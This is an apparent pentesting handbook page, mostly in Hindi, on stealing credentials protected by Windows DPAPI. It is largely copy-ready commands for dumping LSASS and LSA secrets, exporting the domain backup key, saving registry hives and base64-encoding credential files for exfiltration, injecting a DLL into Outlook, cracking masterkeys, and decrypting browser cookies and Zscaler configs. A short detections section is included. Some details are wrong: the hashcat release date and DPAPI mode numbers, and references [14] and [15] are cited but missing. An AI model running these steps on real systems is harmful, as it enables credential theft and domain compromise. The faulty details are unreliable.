# DPAPI - Passwords निकालना

{{#include ../../banners/hacktricks-training.md}}



## DPAPI क्या है

Data Protection API (DPAPI) का उपयोग मुख्य रूप से Windows operating system में **asymmetric private keys के symmetric encryption** के लिए किया जाता है। इसमें entropy के एक महत्वपूर्ण स्रोत के रूप में user या system secrets का उपयोग होता है। यह तरीका developers के लिए encryption को आसान बनाता है: वे user के logon secrets से बनी key का उपयोग करके data encrypt कर सकते हैं, या system encryption के लिए system के domain authentication secrets का उपयोग कर सकते हैं। इससे developers को encryption key की सुरक्षा खुद manage करने की ज़रूरत नहीं पड़ती।

DPAPI का उपयोग करने का सबसे आम तरीका **`CryptProtectData` और `CryptUnprotectData`** functions के ज़रिए है। ये applications को वर्तमान में logged-on process के security context का उपयोग करके data encrypt और decrypt करने देते हैं। डिफ़ॉल्ट रूप से, data को केवल वही user या system context decrypt कर सकता है जिसने उसे encrypt किया था।<sup>[[2]](#references)[[3]](#references)</sup>

ये functions encryption और decryption के दौरान इस्तेमाल होने वाला एक वैकल्पिक **entropy parameter** भी स्वीकार करते हैं। वैकल्पिक entropy से protected data को decrypt करने के लिए उसी entropy value की आवश्यकता होती है।<sup>[[2]](#references)[[6]](#references)</sup>

### Users key generation

DPAPI user के credentials से एक user-specific value (जिसे अक्सर **pre-key** कहा जाता है) बनाता है। इसे बनाने का सटीक तरीका account और operating-system version पर निर्भर करता है। उदाहरण के लिए, Impacket SHA-1 digest of the UTF-16LE password पर आधारित एक HMAC-SHA1 path, password के MD4/NT hash पर आधारित एक अन्य path, और Protected Users के लिए PBKDF2-SHA256-derived path आज़माता है। इसी वजह से offline tooling अक्सर plaintext password या उपलब्ध NT hash से आवश्यक material derive कर सकती है।<sup>[[2]](#references)[[10]](#references)</sup>

यह खास तौर पर महत्वपूर्ण है, क्योंकि अगर attacker user का password hash प्राप्त कर ले, तो वह:

- **उस user की key से DPAPI द्वारा encrypt किया गया कोई भी data decrypt** कर सकता है, और इसके लिए किसी API से संपर्क करने की ज़रूरत नहीं होती
- valid DPAPI key बनाने की कोशिश में offline **password crack** कर सकता है

DPAPI हर protected blob के लिए नया master key बनाने के बजाय, प्रत्येक user के लिए एक या अधिक **master keys** रखता है। हर master key का एक **GUID** (Globally Unique Identifier) होता है, और encrypted blob में दर्ज होता है कि उसे किस master key से protect किया गया है।<sup>[[2]](#references)</sup>

Master keys **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** directory में stored होती हैं, जहाँ `{SID}` user का Security Identifier है। Master-key file में user के **pre-key** से protected material होता है और, domain users के मामले में, **domain backup key** से protected recovery material भी होता है।<sup>[[2]](#references)</sup>

ध्यान दें कि **master key को encrypt करने के लिए इस्तेमाल होने वाली domain key domain controllers में होती है और कभी नहीं बदलती**। इसलिए, अगर attacker के पास domain controller का access है, तो वह domain backup key प्राप्त करके domain के सभी users की master keys decrypt कर सकता है।<sup>[[2]](#references)</sup>

Encrypted blobs के headers में उस **master key का GUID** होता है जिसका उपयोग उनके भीतर का data encrypt करने के लिए किया गया था।

> [!TIP]
> DPAPI encrypted blobs की शुरुआत **`01 00 00 00`** से होती है

Master keys खोजें:

```bash
Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
```

This एक user की कई Master Keys कुछ इस तरह दिखेंगी:

![What is DPAPI - Users key generation: इस तरह एक user की कई Master Keys दिखेंगी](<../../images/image (1121).png>)

### Machine/System key generation

यह वह key है जिसका उपयोग machine data encrypt करने के लिए करती है। यह **DPAPI_SYSTEM LSA secret** पर आधारित है, जो एक विशेष key है जिसे केवल SYSTEM user ही access कर सकता है। इस key का उपयोग ऐसे data को encrypt करने के लिए किया जाता है जिसे system को खुद access करना ज़रूरी होता है, जैसे machine-level credentials या system-wide secrets।<sup>[[2]](#references)</sup>

ध्यान दें कि इन keys का **domain backup नहीं होता**, इसलिए इन्हें केवल locally access किया जा सकता है:

- **Mimikatz** `mimikatz lsadump::secrets` command का उपयोग करके LSA secrets dump कर इसे access कर सकता है
- यह secret registry में stored होता है, इसलिए कोई administrator इसे access करने के लिए **DACL permissions modify कर सकता है**। Registry path है: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
- Registry hives से offline extraction भी संभव है। उदाहरण के लिए, target पर administrator के रूप में hives save करें और उन्हें exfiltrate करें:

```cmd
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

फिर अपने analysis box पर, hives से DPAPI_SYSTEM LSA secret निकालें और machine-scope DPAPI blobs को decrypt करने के लिए उसका उपयोग करें (उदाहरण के लिए, machine-protected application credentials या Wi-Fi profiles):

```text
mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
# Look for the DPAPI_SYSTEM secret in the output
```

Veeam-विशिष्ट DPAPI उदाहरण:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

### DPAPI द्वारा सुरक्षित डेटा

DPAPI द्वारा सुरक्षित व्यक्तिगत डेटा में शामिल हैं:

- Windows creds
- Internet Explorer और Google Chrome के passwords और auto-completion डेटा
- Outlook और Windows Mail जैसे applications के E-mail और internal FTP account passwords
- Shared folders, resources, wireless networks और Windows Vault के passwords, जिनमें encryption keys भी शामिल हैं
- Remote desktop connections, .NET Passport और विभिन्न encryption तथा authentication उद्देश्यों के लिए private keys के passwords
- Credential Manager द्वारा प्रबंधित network passwords और CryptProtectData का उपयोग करने वाले applications, जैसे Skype, MSN messenger और अन्य में व्यक्तिगत डेटा
- Registry के अंदर encrypted blobs
- ...

System द्वारा सुरक्षित डेटा में शामिल हैं:
- Wifi passwords
- ...

Scheduled-task passwords, LSA-secret से जुड़ा एक अलग मामला हैं। [Password logon type](https://learn.microsoft.com/en-us/windows/win32/api/taskschd/ne-taskschd-task_logon_type) के साथ registered कोई task, local administrator/SYSTEM recovery के लिए password store कर सकता है; S4U या interactive-token task से यह साबित नहीं होता कि password save किया गया था। Task का principal और logon type, केवल उसके run-as name की तुलना में अधिक भरोसेमंद संकेत हैं।

### Master key निकालने के विकल्प

- यदि user के पास domain admin privileges हैं, तो वह domain में सभी user master keys को decrypt करने के लिए **domain backup key** तक पहुँच सकता है:

```bash
# Mimikatz
lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export

# SharpDPAPI
SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
```

- लोकल admin privileges के साथ, सभी connected users की DPAPI master keys और SYSTEM key निकालने के लिए **LSASS memory तक पहुंचना** संभव है।

```bash
# Mimikatz
mimikatz sekurlsa::dpapi
```

- यदि user के पास local admin privileges हैं, तो वे machine master keys को decrypt करने के लिए **DPAPI_SYSTEM LSA secret** तक access कर सकते हैं:

```bash
# Mimikatz
lsadump::secrets /system:DPAPI_SYSTEM /export
```

- यदि user का password या NTLM hash ज्ञात है, तो आप **user की master keys को सीधे decrypt कर सकते हैं**:

```bash
# Mimikatz
dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected

# SharpDPAPI
SharpDPAPI.exe masterkeys /password:PASSWORD
```

- यदि आप user के रूप में किसी session में हैं, तो **RPC का उपयोग करके master keys decrypt करने के लिए backup key** के लिए DC से अनुरोध कर सकते हैं। यदि आप local admin हैं और user logged in है, तो आप उसका **session token चुरा सकते हैं**:

```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```


## Vault की सूची

```bash
# From cmd
vaultcmd /listcreds:"Windows Credentials" /all

# From mimikatz
mimikatz vault::list
```

## DPAPI एन्क्रिप्ट किए गए डेटा तक पहुँचें

### DPAPI एन्क्रिप्ट किया गया डेटा खोजें

सामान्य उपयोगकर्ताओं की **सुरक्षित फ़ाइलें** यहाँ होती हैं:

- `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
- `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
- ऊपर दिए गए paths में `\Roaming\` को `\Local\` से बदलकर भी देखें।

Enumeration के उदाहरण:

```bash
dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
```

[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) file system, registry और B64 blobs में DPAPI encrypted blobs खोज सकता है:<sup>[[12]](#references)</sup>

```bash
# Search blobs in the registry
search /type:registry [/path:HKLM] # Search complete registry by default

# Search blobs in folders
search /type:folder /path:C:\path\to\folder
search /type:folder /path:C:\Users\username\AppData\

# Search a blob inside a file
search /type:file /path:C:\path\to\file

# Search a blob inside B64 encoded data
search /type:base64 [/base:<base64 string>]
```

ध्यान दें कि [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (उसी repo से) का इस्तेमाल cookies जैसे संवेदनशील data को DPAPI का उपयोग करके decrypt करने के लिए किया जा सकता है।<sup>[[12]](#references)</sup>

#### Chromium/Edge/Electron की त्वरित recipes (SharpChrome)

- मौजूदा user के लिए, saved logins/cookies का interactive decryption (Chrome 127+ के app-bound cookies के साथ भी काम करता है, क्योंकि user context में चलने पर extra key को user के Credential Manager से resolve किया जाता है):

```cmd
SharpChrome logins  /browser:edge  /unprotect
SharpChrome cookies /browser:chrome /format:csv /unprotect
```

- ऑफ़लाइन विश्लेषण, जब आपके पास केवल फ़ाइलें हों। पहले प्रोफ़ाइल के "Local State" से AES state key निकालें, फिर cookie DB को decrypt करने के लिए उसका उपयोग करें:

```cmd
# Dump the AES state key from Local State (DPAPI will be used if running as the user)
SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
```

- जब आपके पास DPAPI domain backup key (PVK) हो और target host पर admin access हो, तब पूरे domain में/दूरस्थ रूप से triage करें:

```cmd
SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
```

- यदि आपके पास user की DPAPI prekey/credkey (LSASS से) है, तो आप password cracking को छोड़कर सीधे profile data decrypt कर सकते हैं:

```cmd
# For SharpChrome use /prekey; for SharpDPAPI use /credkey
SharpChrome cookies /browser:edge /prekey:SHA1_HEX
SharpDPAPI.exe credentials /credkey:SHA1_HEX
```

नोट्स
- Chrome/Edge के नए builds कुछ cookies को "App-Bound" encryption का उपयोग करके store कर सकते हैं। अतिरिक्त app-bound key के बिना उन specific cookies को offline decrypt करना संभव नहीं है; इसे अपने-आप retrieve करने के लिए SharpChrome को target user context में चलाएँ। नीचे दिए गए Chrome security blog post को देखें।<sup>[[5]](#references)</sup>

### Access keys और data

- मौजूदा session से DPAPI encrypted files में से credentials पाने के लिए **SharpDPAPI** का उपयोग करें:

```bash
# Decrypt user data
## Note that 'triage' is like running credentials, vaults, rdg and certificates
SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect

# Decrypt machine data
SharpDPAPI.exe machinetriage 
```

- **credentials की जानकारी प्राप्त करें** जैसे encrypted data और guidMasterKey.<sup>[[3]](#references)</sup>

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7

[...]
guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
[...]
pbData             : b8f619[...snip...]b493fe
[..]
```

- **masterkeys तक पहुंचें**:

RPC का उपयोग करके **domain backup key** का अनुरोध करने वाले user की masterkey decrypt करें:
```bash
# Mimikatz
dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc

# SharpDPAPI
SharpDPAPI.exe masterkeys /rpc
```

**SharpDPAPI** tool masterkey decryption के लिए इन arguments को भी support करता है (ध्यान दें कि domains backup key पाने के लिए `/rpc`, plaintext password इस्तेमाल करने के लिए `/password`, या DPAPI domain private key file निर्दिष्ट करने के लिए `/pvk` का उपयोग किया जा सकता है...):<sup>[[12]](#references)</sup>

```
/target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
/pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk            -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X             -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X                 -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X              -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                    -   decrypt the target user's masterkeys by asking domain controller to do so
/server:SERVER          -   triage a remote server, assuming admin access
/hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
```

- **masterkey का उपयोग करके data को decrypt करें**:

```bash
# Mimikatz
dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>

# SharpDPAPI
SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
```

**SharpDPAPI** टूल `credentials|vaults|rdg|keepass|triage|blob|ps` decryption के लिए इन arguments को भी support करता है (ध्यान दें कि domains backup key पाने के लिए `/rpc`, plaintext password इस्तेमाल करने के लिए `/password`, DPAPI domain private key file निर्दिष्ट करने के लिए `/pvk`, और current users session इस्तेमाल करने के लिए `/unprotect` का उपयोग किया जा सकता है...):<sup>[[12]](#references)</sup>

```
Decryption:
/unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
/pvk:BASE64...      -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
/pvk:key.pvk        -   use a DPAPI domain private key file to first decrypt reachable user masterkeys
/password:X         -   decrypt the target user's masterkeys using a plaintext password (works remotely)
/ntlm:X             -   decrypt the target user's masterkeys using a NTLM hash (works remotely)
/credkey:X          -   decrypt the target user's masterkeys using a DPAPI credkey (domain or local SHA1, works remotely)
/rpc                -   decrypt the target user's masterkeys by asking domain controller to do so
GUID1:SHA1 ...      -   use a one or more GUID:SHA1 masterkeys for decryption
/mkfile:FILE        -   use a file of one or more GUID:SHA1 masterkeys for decryption

Targeting:
/target:FILE/folder -   triage a specific 'Credentials','.rdg|RDCMan.settings', 'blob', or 'ps' file location, or 'Vault' folder
/server:SERVER      -   triage a remote server, assuming admin access
                        Note: must use with /pvk:KEY or /password:X
                        Note: not applicable to 'blob' or 'ps' commands
```

- DPAPI prekey/credkey का सीधे उपयोग करना (password की आवश्यकता नहीं)

यदि आप LSASS dump कर सकते हैं, तो Mimikatz अक्सर प्रति-logon DPAPI key दिखाता है, जिसका उपयोग plaintext password जाने बिना user की masterkeys को decrypt करने के लिए किया जा सकता है। इस value को सीधे tooling में दें:

```cmd
# SharpDPAPI accepts the "credkey" (domain or local SHA1)
SharpDPAPI.exe triage /credkey:SHA1_HEX

# SharpChrome accepts the same value as a "prekey"
SharpChrome logins /browser:edge /prekey:SHA1_HEX
```


- **current user session** का उपयोग करके कुछ data decrypt करें:

```bash
# Mimikatz
dpapi::blob /in:C:\path\to\encrypted\file /unprotect

# SharpDPAPI
SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
```

---

### Impacket dpapi.py से offline decryption

यदि आपके पास victim user का SID और password (या NT hash) है, तो आप Impacket के dpapi.py का उपयोग करके DPAPI masterkeys और Credential Manager blobs को पूरी तरह offline decrypt कर सकते हैं।<sup>[[10]](#references)[[11]](#references)</sup>

- disk पर artefacts खोजें:
  - Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
  - Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}

- यदि file transfer tooling भरोसेमंद ढंग से काम नहीं कर रही है, तो host पर files को base64 में बदलें और output copy करें:

```powershell
# Base64-encode files for copy/paste exfil
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
```

- user के SID और password/hash का उपयोग करके masterkey को Decrypt करें:

```bash
# Plaintext password
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'

# Or with NT hash
python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
  -sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
```

- Credential blob को decrypt करने के लिए decrypted masterkey का उपयोग करें:

```bash
python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
# Username=<user> ; Password=<cleartext>
```

यह workflow अक्सर Windows Credential Manager का उपयोग करने वाले apps द्वारा सेव किए गए domain credentials रिकवर करता है, जिनमें administrative accounts (जैसे, `*_adm`) भी शामिल हैं।

---

### वैकल्पिक Entropy ("Third-party entropy" को संभालना)

कुछ applications `CryptProtectData` को एक अतिरिक्त **entropy** value देते हैं। इस value के बिना blob को decrypt नहीं किया जा सकता, भले ही सही masterkey ज्ञात हो। इसलिए, इस तरह सुरक्षित credentials को target करते समय entropy प्राप्त करना आवश्यक है (जैसे, Microsoft Outlook और कुछ VPN clients)।

[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) एक user-mode DLL है, जो target process के भीतर DPAPI functions को hook करता है और दी गई किसी भी optional entropy को पारदर्शी रूप से record करता है। `outlook.exe` या `vpnclient.exe` जैसी processes के विरुद्ध **DLL-injection** mode में EntropyCapture चलाने से एक ऐसी file बनती है, जो हर entropy buffer को calling process और blob से map करती है। इस captured entropy को बाद में data decrypt करने के लिए **SharpDPAPI** (`/entropy:`) या **Mimikatz** (`/entropy:<file>`) में दिया जा सकता है।<sup>[[6]](#references)</sup>

```powershell
# Inject EntropyCapture into the current user's Outlook
InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll

# Later decrypt a credential blob that required entropy
SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
```


### Offline masterkeys की cracking (Hashcat & DPAPISnoop)

Microsoft ने Windows 10 v1607 (2016) से शुरू होने वाले **context 3** masterkey format को पेश किया। `hashcat` v6.2.6 (December 2023) में hash-modes **22100** (DPAPI masterkey v1 context ), **22101** (context 1) और **22102** (context 3) जोड़े गए, जिससे masterkey file से सीधे user passwords की GPU-accelerated cracking संभव हुई। इसलिए attackers target system से interact किए बिना word-list या brute-force attacks कर सकते हैं।<sup>[[7]](#references)</sup>

`DPAPISnoop` (2024) इस प्रक्रिया को automate करता है:

```bash
# Parse a whole Protect folder, generate hashcat format and crack
DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
hashcat -m 22102 bob.hc wordlist.txt -O -w4
```

Tool Credential और Vault blobs को भी parse कर सकता है, उन्हें cracked keys से decrypt कर सकता है और cleartext passwords export कर सकता है।<sup>[[8]](#references)</sup>


### दूसरी मशीन का डेटा एक्सेस करना

**SharpDPAPI और SharpChrome** में, किसी remote machine का डेटा एक्सेस करने के लिए **`/server:HOST`** विकल्प निर्दिष्ट कर सकते हैं। बेशक, आपको उस मशीन को एक्सेस करने में सक्षम होना चाहिए और नीचे दिए गए उदाहरण में माना गया है कि **domain backup encryption key ज्ञात है**:

```bash
SharpDPAPI.exe triage /server:HOST /pvk:BASE64
SharpChrome cookies /server:HOST /pvk:BASE64
```

### SSRS report-server database connection

SQL Server Reporting Services (SSRS) होस्ट पर, `RSReportServer.config` में report-server database के लिए एन्क्रिप्टेड `<Dsn>` हो सकता है।<sup>[[15]](#references)</sup> SSRS इन connection settings को **local machine-level key** से सुरक्षित करता है; बाहरी report data sources के credentials इसके बजाय report-server database में उसकी symmetric key से एन्क्रिप्ट किए जाते हैं।<sup>[[14]](#references)</sup>

रिपोर्ट किए गए मामले में, attacker ने `Dsn` निकाला और उसके Base64-decoded bytes को `ProtectedData.Unprotect` और `LocalMachine` scope से decrypt करने की कोशिश की।<sup>[[13]](#references)</sup>

जिस मशीन पर इसे सुरक्षित किया गया था, उस पर SSRS configuration file की read access मिलने पर, वास्तविक instance path ढूँढें और value की जाँच करें। उदाहरण path SSRS 2017 और उसके बाद के संस्करणों के लिए है; machine-level protection के लिए SSRS service-account context की आवश्यकता नहीं होती।<sup>[[14]](#references)[[15]](#references)</sup>

```powershell
$path = 'C:\Program Files\Microsoft SQL Server Reporting Services\SSRS\ReportServer\rsreportserver.config'
$config = Get-Content $path -Raw
$b64 = [regex]::Match($config, '<Dsn>([^<]+)</Dsn>').Groups[1].Value
$blob = [Convert]::FromBase64String($b64)
$plain = [Security.Cryptography.ProtectedData]::Unprotect($blob, $null, 'LocalMachine')
[Text.Encoding]::UTF8.GetString($plain)
```

एक खाली या अनुपस्थित `Dsn` इस method को decrypt करने के लिए कुछ नहीं देता।<sup>[[15]](#references)</sup> Decrypted connection string में ज़रूरी नहीं कि दोबारा इस्तेमाल किया जा सकने वाला password हो: SSRS अपने service account का उपयोग कर सकता है, या configured domain account में अलग-अलग `LogonUser`, `LogonDomain` और `LogonCred` settings हो सकती हैं।<sup>[[15]](#references)</sup> सिर्फ encrypted value को किसी दूसरी machine पर copy करने से उस machine को मूल host की protection key नहीं मिलती।<sup>[[14]](#references)</sup>

SQL Server के अन्य access paths के लिए, [MSSQL pentesting](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/) देखें।

## अन्य tools

### HEKATOMB

[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) एक tool है जो LDAP directory से सभी users और computers निकालने तथा RPC के ज़रिए domain controller backup key निकालने की प्रक्रिया को automate करता है। इसके बाद script सभी computers के IP address resolve करती है और सभी computers पर smbclient चलाकर सभी users के DPAPI blobs प्राप्त करती है और domain backup key से सब कुछ decrypt करती है।

`python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`

LDAP से निकाली गई computers list की मदद से आप हर sub network ढूँढ सकते हैं, भले ही आपको उनके बारे में पहले से पता न हो!

### DonPAPI 2.x (2024-05)

[**DonPAPI**](https://github.com/login-securite/DonPAPI) DPAPI से सुरक्षित secrets को अपने-आप dump कर सकता है। 2.x release में ये सुविधाएँ जोड़ी गईं:<sup>[[9]](#references)</sup>

* सैकड़ों hosts से blobs का parallel collection
* **context 3** masterkeys की parsing और automatic Hashcat cracking integration
* Chrome "App-Bound" encrypted cookies के लिए support (अगला section देखें)
* बार-बार endpoints को poll करने और नए बनाए गए blobs में अंतर देखने के लिए नया **`--snapshot`** mode 

### DPAPISnoop

[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) masterkey/credential/vault files के लिए एक C# parser है, जो Hashcat/JtR formats में output दे सकता है और वैकल्पिक रूप से cracking अपने-आप चला सकता है। यह Windows 11 24H1 तक के machine और user masterkey formats को पूरी तरह support करता है।<sup>[[8]](#references)</sup>


## आम detections

- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`, `C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` और DPAPI से जुड़ी अन्य directories में files तक access।
    - खासकर **C$** या **ADMIN$** जैसे network share से।
- LSASS memory तक access करने या masterkeys dump करने के लिए **Mimikatz**, **SharpDPAPI** या इसी तरह के tooling का उपयोग।
- Event **4662**: *किसी object पर operation किया गया* – इसे **`BCKUPKEY`** object तक access के साथ correlate किया जा सकता है।
- जब कोई process *SeTrustedCredManAccessPrivilege* (Credential Manager) का अनुरोध करता है, तब Event **4673/4674**।

---
### 2023-2025 की vulnerabilities और ecosystem में बदलाव

* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (नवंबर 2023)। Network access वाला attacker किसी domain member को malicious DPAPI backup key प्राप्त करने के लिए धोखा दे सकता था, जिससे user masterkeys decrypt किए जा सकते थे। नवंबर 2023 cumulative update में patch जारी किया गया था – administrators को सुनिश्चित करना चाहिए कि DCs और workstations पूरी तरह patched हों।<sup>[[4]](#references)</sup>
* **Chrome 127 “App-Bound” cookie encryption** (जुलाई 2024) ने पुरानी DPAPI-only protection की जगह एक अतिरिक्त key का उपयोग शुरू किया, जो user के **Credential Manager** में store होती है। अब cookies को offline decrypt करने के लिए DPAPI masterkey और **GCM-wrapped app-bound key** दोनों की ज़रूरत होती है। User context में चलने पर SharpChrome v2.3 और DonPAPI 2.x अतिरिक्त key को recover कर सकते हैं।<sup>[[5]](#references)</sup>


### Case Study: Zscaler Client Connector – SID से निकली Custom Entropy

Zscaler Client Connector कई configuration files `C:\ProgramData\Zscaler` के अंतर्गत store करता है (जैसे `config.dat`, `users.dat`, `*.ztc`, `*.mtt`, `*.mtc`, `*.mtp`)। हर file **DPAPI (Machine scope)** से encrypted होती है, लेकिन vendor **custom entropy** देता है, जिसे disk पर store करने के बजाय *runtime पर calculate* किया जाता है।<sup>[[1]](#references)</sup>

Entropy दो elements से फिर बनाई जाती है:

1. `ZSACredentialProvider.dll` में embedded एक hard-coded secret।
2. उस Windows account का **SID** जिससे configuration जुड़ी होती है।

DLL द्वारा implement किया गया algorithm इसके बराबर है:

```csharp
byte[] secret = Encoding.UTF8.GetBytes(HARDCODED_SECRET);
byte[] sid    = Encoding.UTF8.GetBytes(CurrentUserSID);

// XOR the two buffers byte-by-byte
byte[] tmp = new byte[secret.Length];
for (int i = 0; i < secret.Length; i++)
    tmp[i] = (byte)(sid[i] ^ secret[i]);

// Split in half and XOR both halves together to create the final entropy buffer
byte[] entropy = new byte[tmp.Length / 2];
for (int i = 0; i < entropy.Length; i++)
    entropy[i] = (byte)(tmp[i] ^ tmp[i + entropy.Length]);
```

क्योंकि secret एक ऐसी DLL में embedded है जिसे disk से पढ़ा जा सकता है, **SYSTEM अधिकारों वाला कोई भी local attacker किसी भी SID के लिए entropy फिर से generate कर सकता है** और blobs को offline decrypt कर सकता है:

```csharp
byte[] blob = File.ReadAllBytes(@"C:\ProgramData\Zscaler\<SID>++config.dat");
byte[] clear = ProtectedData.Unprotect(blob, RebuildEntropy(secret, sid), DataProtectionScope.LocalMachine);
Console.WriteLine(Encoding.UTF8.GetString(clear));
```

Decryption से पूरी JSON configuration मिलती है, जिसमें हर **device posture check** और उसका अपेक्षित मान शामिल होता है – client-side bypasses का प्रयास करते समय यह जानकारी बहुत उपयोगी होती है।

> सुझाव: अन्य encrypted artefacts (`*.mtt`, `*.mtp`, `*.mtc`, `*.ztc`) DPAPI से **बिना** entropy (`16` zero bytes) के सुरक्षित किए जाते हैं। इसलिए SYSTEM privileges मिलने के बाद इन्हें सीधे `ProtectedData.Unprotect` से decrypt किया जा सकता है।

## References

- [1] [Synacktiv – क्या आपको अपने zero trust पर भरोसा करना चाहिए? Zscaler posture checks को bypass करना](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [2] [DPAPI Secrets. DPAPI में सुरक्षा विश्लेषण और data recovery](https://www.passcape.com/index.php?section=docsys&cmd=details&id=28#13)
- [3] [Mimikatz और C++ से DPAPI Encrypted Secrets पढ़ना](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/reading-dpapi-encrypted-secrets-with-mimikatz-and-c++#using-dpapis-to-encrypt-decrypt-data-in-c)
- [4] [CVE-2023-36004 - Windows DPAPI (Data Protection Application Programming Interface) Spoofing Vulnerability](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2023-36004)
- [5] [Windows पर Chrome cookies की सुरक्षा बेहतर करना](https://security.googleblog.com/2024/07/improving-security-of-chrome-cookies-on.html)
- [6] [EntropyCapture: DPAPI Optional Entropy का सरल निष्कर्षण](https://specterops.io/blog/2022/05/18/entropycapture-simple-extraction-of-dpapi-optional-entropy/)
- [7] [hashcat v6.2.6 रिलीज़ नोट्स](https://github.com/Hashcat/Hashcat/releases/tag/v6.2.6)
- [8] [DPAPISnoop – GitHub repository](https://github.com/Leftp/DPAPISnoop)
- [9] [DonPAPI 2.0.1 – PyPI project पेज](https://pypi.org/project/donpapi/2.0.0/)
- [10] [Impacket – dpapi.py](https://github.com/fortra/impacket)
- [11] [HTB Puppy: AD ACL का दुरुपयोग, KeePassXC Argon2 cracking, और DC admin तक DPAPI decryption](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [12] [GhostPack SharpDPAPI/SharpChrome – उपयोग और विकल्प](https://github.com/GhostPack/SharpDPAPI)
- [13] [CyberStrikeAI वास्तविक हमलों में: संगठनों पर वास्तविक दुनिया के हमलों में AI का उपयोग](https://securelist.com/tr/cyberstrikeai-attacks/121715)
